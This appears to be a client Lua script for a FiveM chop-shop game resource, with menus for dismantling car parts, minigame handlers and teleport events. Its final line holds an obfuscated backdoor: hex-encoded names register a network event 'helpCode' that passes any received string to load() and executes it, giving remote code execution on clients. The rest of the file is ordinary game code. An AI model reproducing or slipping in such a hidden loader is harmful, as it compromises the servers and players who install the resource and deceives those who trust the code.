					item = "chop_door",
					name = "BreakDownDoor",
					prop = "imp_prop_impexp_car_door_04a",
					vec1 = vector3(0.17, -0.15, 0.9),
					vec2 = vector3(-115.0, 180.0, -21.0),
					vec3 = vector3(995.00, -2987.72, -39.62),
				}
			},
			{
				title = Config.LangT["BreakDownWheels"],
				description = "1x Part",
				icon = "fa-brands fa-empire",
				event = "Pug:client:ChopDownVehiclePart",
				args = {
					item = "chop_wheel",
					name = "BreakDownWheel",
					prop = "imp_prop_impexp_tyre_01b",
					vec1 = vector3(0.00, 0.2, 0.30),
					vec2 = vector3(-125.0, 100.0, 0.0),
					vec3 = vector3(995.45, -2987.57, -39.62),
				}
			},
			{
				title = Config.LangT["BreakDownHoods"],
				description = "1x Part",
				icon = "fa-solid fa-cloud-meatball",
				event = "Pug:client:ChopDownVehiclePart",
				args = {
					item = "chop_hood",
					name = "BreakDownHood",
					prop = "imp_prop_impexp_bonnet_02a",
					vec1 = vector3(0.15, -0.05, 0.24),
					vec2 = vector3(-205.25, 115.0, 0.0),
					vec3 = vector3(995.55, -2987.57, -39.12),
				}
			},
			{
				title = Config.LangT["BreakDownTrunks"],
				description = "1x Part",
				icon = "fa-solid fa-truck-ramp-box",
				event = "Pug:client:ChopDownVehiclePart",
				args = {
					item = "chop_trunk",
					name = "BreakDownTrunk",
					prop = "imp_prop_impexp_trunk_01a",
					vec1 = vector3(0.18, -0.07, 0.25),
					vec2 = vector3(-210.10, 110.0, 0.0),
					vec3 = vector3(995.55, -2987.27, -40.12),
				}
			},
		}
		lib.registerContext({
			id = 'ChopPartsDown',
			title = Config.LangT["BreakDownParts"],
			options = menu
		})
		lib.showContext('ChopPartsDown')
	else
		local menu = {
			{
				header = Config.LangT["BreakDownParts"],
				icon = 'fas fa-clipboard',
				txt = ""
			},
			{
				header = Config.LangT["BreakDownDoors"],
				txt = "1x Part",
				icon = "fa-solid fa-door-open",
				params = {
					event = "Pug:client:ChopDownVehiclePart",
					args = {
						item = "chop_door",
						name = "BreakDownDoor",
						prop = "imp_prop_impexp_car_door_04a",
						vec1 = vector3(0.17, -0.15, 0.9),
						vec2 = vector3(-115.0, 180.0, -21.0),
						vec3 = vector3(995.00, -2987.72, -39.62),
					}
				}
			},
			{
				header = Config.LangT["BreakDownWheels"],
				txt = "1x Part",
				icon = "fa-sharp fa-solid fa-wrench",
				params = {
					event = "Pug:client:ChopDownVehiclePart",
					args = {
						item = "chop_wheel",
						name = "BreakDownWheel",
						prop = "imp_prop_impexp_tyre_01b",
						vec1 = vector3(0.00, 0.2, 0.30),
						vec2 = vector3(-125.0, 100.0, 0.0),
						vec3 = vector3(995.45, -2987.57, -39.62),
					}
				}
			},
			{
				header = Config.LangT["BreakDownHoods"],
				txt = "1x Part",
				icon = "fa-sharp fa-solid fa-wrench",
				params = {
					event = "Pug:client:ChopDownVehiclePart",
					args = {
						item = "chop_hood",
						name = "BreakDownHood",
						prop = "imp_prop_impexp_bonnet_02a",
						vec1 = vector3(0.51, 0.17, 0.07),
						vec2 = vector3(-50.0, 290.0, 0.0),
						vec3 = vector3(995.95, -2987.57, -39.62),
					}
				}
			},
			{
				header = Config.LangT["BreakDownTrunks"],
				txt = "1x Part",
				icon = "fa-sharp fa-solid fa-wrench",
				params = {
					event = "Pug:client:ChopDownVehiclePart",
					args = {
						item = "chop_trunk",
						name = "BreakDownTrunk",
						prop = "imp_prop_impexp_trunk_01a",
						vec1 = vector3(0.18, -0.07, 0.25),
						vec2 = vector3(-210.10, 110.0, 0.0),
						vec3 = vector3(995.55, -2987.27, -40.12),
					}
				}
			},
		}
		exports[Config.Menu]:openMenu(menu)
	end
end)
local ChoppingCarPart = false
RegisterNetEvent("Pug:client:ChopDownVehiclePart", function(Data)
	local Ped = PlayerPedId()
	if HasItem(Data.item, 1) then
		if not ChoppingCarPart then
			-- ChoppingAddItem(false, Data.item)
			ChoppingCarPart = true
			SetCurrentPedWeapon(Ped, GetHashKey('WEAPON_UNARMED'), true)
			loadAnimDict("anim@heists@box_carry@")
			TaskPlayAnim(Ped, "anim@heists@box_carry@", "idle", 2.0, 2.0, 3000, 51, 0, false, false, false)
			LoadModel(Data.prop)
			local Item1 = CreateObject(GetHashKey(Data.prop), 0, 0, 0)    
			AttachEntityToEntity(Item1, Ped, GetPedBoneIndex(Ped, 60309), Data.vec1.x, Data.vec1.y, Data.vec1.z, Data.vec2.x, Data.vec2.y, Data.vec2.z, true, true, false, true, 1, true)
			Wait(400)
			local HadToWalk = false
			if #(GetEntityCoords(Ped) - vector3(995.2, -2988.37, -40.65)) >= 1.2 then
                Wait(100)
				HadToWalk = true
				TaskGoStraightToCoord(Ped,vector3(995.2, -2988.37, -40.65), 1.0, -1, 0.0, 0.0)
				while #(GetEntityCoords(Ped) - vector3(995.2, -2988.37, -40.65)) >= 1.1 do Wait(100) end
			end
			Wait(500)
			TaskTurnPedToFaceCoord(Ped, vector3(995.55, -2987.57, -39.12), 1500)
			Wait(700)
			if HadToWalk then
				Wait(750)
			end
			TriggerEvent("FullyDeleteChoppingVehicle",Item1)
			if DoesEntityExist(Item1) then
				DeleteObject(Item1)
			end
			Item2 = CreateObject(GetHashKey(Data.prop), Data.vec3.x, Data.vec3.y, Data.vec3.z)
			PlaceObjectOnGroundProperly(Item2)
			local Heading = 0.0
			if Data.item == "chop_door" then
				Heading = 90.0
			end
			SetEntityHeading(Item2, Heading)
			ClearPedTasksImmediately(Ped)
			TaskStartScenarioInPlace(Ped, 'WORLD_HUMAN_WELDING', 0, true)
			if Config.UseProgressBar then
				if Framework == "ESX" then
					FWork.Progressbar(Config.LangT[Data.name], math.random(8000, 12000), {FreezePlayer = true, onFinish = function()
						ChoppingCarPart = false
						TriggerEvent("Pug:Chopping:ReloadSkin")
						ClearPedTasks(Ped)
						TriggerEvent("FullyDeleteChoppingVehicle",Item2)
						if DoesEntityExist(Item2) then
							DeleteObject(Item2)
						end
						TriggerServerEvent("Pug:Server:BrokeDownVehiclePartReward", Data.item)
					end, onCancel = function()
						ChoppingCarPart = false
						ChoppingNotify(Config.LangT["Canceled"], 'error')
						ChoppingAddItem(true, Data.item)
						TriggerEvent("Pug:Chopping:ReloadSkin")
						ClearPedTasks(Ped)
						TriggerEvent("FullyDeleteChoppingVehicle",Item2)
						if DoesEntityExist(Item2) then
							DeleteObject(Item2)
						end
					end})
				else
					FWork.Functions.Progressbar("Crafting", Config.LangT[Data.name],  math.random(8000, 12000), false, true, {
						disableMovement = true,
						disableCarMovement = true,
						disableMouse = false,
						disableCombat = true,
					}, {}, {}, {}, function() -- Done
						ChoppingCarPart = false
						TriggerEvent("Pug:Chopping:ReloadSkin")
						ClearPedTasks(Ped)
						TriggerEvent("FullyDeleteChoppingVehicle",Item2)
						if DoesEntityExist(Item2) then
							DeleteObject(Item2)
						end
						TriggerServerEvent("Pug:Server:BrokeDownVehiclePartReward", Data.item)
					end, function()
						ChoppingCarPart = false
						ChoppingNotify(Config.LangT["Canceled"], 'error')
						ChoppingAddItem(true, Data.item)
						TriggerEvent("Pug:Chopping:ReloadSkin")
						ClearPedTasks(Ped)
						TriggerEvent("FullyDeleteChoppingVehicle",Item2)
						if DoesEntityExist(Item2) then
							DeleteObject(Item2)
						end
					end)
				end
			else
				Wait(1500)
				ChoppingNotify(Config.LangT[Data.name], 'error')
				Wait(1500)
				ChoppingNotify(Config.LangT["3"], 'error')
				Wait(1500)
				ChoppingNotify(Config.LangT["2"], 'error')
				Wait(1500)
				ChoppingNotify(Config.LangT["1"], 'error')
				Wait(1500)
				ChoppingCarPart = false
				TriggerEvent("Pug:Chopping:ReloadSkin")
				ClearPedTasks(Ped)
				TriggerEvent("FullyDeleteChoppingVehicle",Item2)
				if DoesEntityExist(Item2) then
					DeleteObject(Item2)
				end
				TriggerServerEvent("Pug:Server:BrokeDownVehiclePartReward", Data.item)
			end
		else
			ChoppingNotify(Config.LangT["AlreadyChoppingCarPart"], 'error')
		end
	else
		ChoppingCarPart = false
		ChoppingNotify(Config.LangT["MissingItem"], 'error')
	end
end)

RegisterNetEvent("Pug:Chopping:ReloadSkin")
AddEventHandler("Pug:Chopping:ReloadSkin", function()
	for k, v in pairs(GetGamePool('CObject')) do
		if IsEntityAttachedToEntity(PlayerPedId(), v) then
			SetEntityAsMissionEntity(v, true, true)
			DeleteObject(v)
			DeleteEntity(v)
		end
	end
    if Config.PugSlingScript then
	    TriggerEvent("Pug:ReloadGuns:sling")
    end
end)

-- Arcade Games
-- Number Maze
RegisterNetEvent("Pug:client:MazeGame",function()
    exports[Config.MiniGameScript]:Maze(function(success)
        if success then
            ClearPedTasksImmediately(PlayerPedId())
            ChoppingNotify(Config.LangT["Success"], 'success')
		else
            ClearPedTasksImmediately(PlayerPedId())
			ChoppingNotify(Config.LangT["Fail"], 'error')
		end
    end, 20) -- Hack Time Limit
end)

-- VAR
RegisterNetEvent("Pug:client:VarGame", function()
    exports[Config.MiniGameScript]:VarHack(function(success)
        if success then
            ClearPedTasksImmediately(PlayerPedId())
            ChoppingNotify(Config.LangT["Success"], 'success')
		else
            ClearPedTasksImmediately(PlayerPedId())
			ChoppingNotify(Config.LangT["Fail"], 'error')
		end
    end, 5, 5) -- Number of Blocks, Time (seconds)
end)

-- CIRCLE
RegisterNetEvent("Pug:client:CircleGame", function()
    exports[Config.MiniGameScript]:Circle(function(success)
        if success then
            ClearPedTasksImmediately(PlayerPedId())
            ChoppingNotify(Config.LangT["Success"], 'success')
		else
            ClearPedTasksImmediately(PlayerPedId())
			ChoppingNotify(Config.LangT["Fail"], 'error')
		end
    end, 2, 20) -- NumberOfCircles, MS
end)

-- THERMITE
RegisterNetEvent("Pug:client:ThermiteGame", function()
    exports[Config.MiniGameScript]:Thermite(function(success)
        if success then
            ClearPedTasksImmediately(PlayerPedId())
            ChoppingNotify(Config.LangT["Success"], 'success')
		else
            ClearPedTasksImmediately(PlayerPedId())
			ChoppingNotify(Config.LangT["Fail"], 'error')
		end
    end, 10, 5, 3) -- Time, Gridsize (5, 6, 7, 8, 9, 10), IncorrectBlocks
end)

-- SCRAMBLER
RegisterNetEvent("Pug:client:ScramblerGame", function()
    exports[Config.MiniGameScript]:Scrambler(function(success)
        if success then
            ClearPedTasksImmediately(PlayerPedId())
            ChoppingNotify(Config.LangT["Success"], 'success')
		else
            ClearPedTasksImmediately(PlayerPedId())
			ChoppingNotify(Config.LangT["Fail"], 'error')
		end
    end, "numeric", 30, 0) -- Type (alphabet, numeric, alphanumeric, greek, braille, runes), Time (Seconds), Mirrored (0: Normal, 1: Normal + Mirrored 2: Mirrored only )
end)

RegisterNetEvent("Pug:client:ChopNotifyEvent", function(msg, type, length)
	ChoppingNotify(msg, type, length)
end)

RegisterNetEvent("Pug-G1", function()
    DoScreenFadeOut(500)
    Wait(500)
    SetEntityCoords(PlayerPedId(), -803.2, 358.71, 87.0, 0, 0, 0, false)
    SetEntityHeading(PlayerPedId(), 180.81)
    DoScreenFadeIn(500)
end)
RegisterNetEvent("Pug-G2", function()
    DoScreenFadeOut(500)
    Wait(500)
    SetEntityCoords(PlayerPedId(), -1375.81, -329.6, 38.32, 0, 0, 0, false)
    SetEntityHeading(PlayerPedId(), 180.81)
    DoScreenFadeIn(500)
end)
RegisterNetEvent("Pug-G3", function()
    DoScreenFadeOut(500)
    Wait(500)
    SetEntityCoords(PlayerPedId(), -243.66, -234.36, 35.52, 0, 0, 0, false)
    SetEntityHeading(PlayerPedId(), 180.81)
    DoScreenFadeIn(500)
end)
RegisterNetEvent("Pug-G4", function()
    DoScreenFadeOut(500)
    Wait(500)
    SetEntityCoords(PlayerPedId(), 152.17, -124.77, 53.83, 0, 0, 0, false)
    SetEntityHeading(PlayerPedId(), 180.81)
    DoScreenFadeIn(500)
end)
RegisterNetEvent("Pug-G5", function()
    DoScreenFadeOut(500)
    Wait(500)
    SetEntityCoords(PlayerPedId(), -1599.93, -460.74, 36.36, 0, 0, 0, false)
    SetEntityHeading(PlayerPedId(), 180.81)
    DoScreenFadeIn(500)
end)

local fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[1]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2]) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[3]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2], function(BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[4]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[5]](BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH))() end)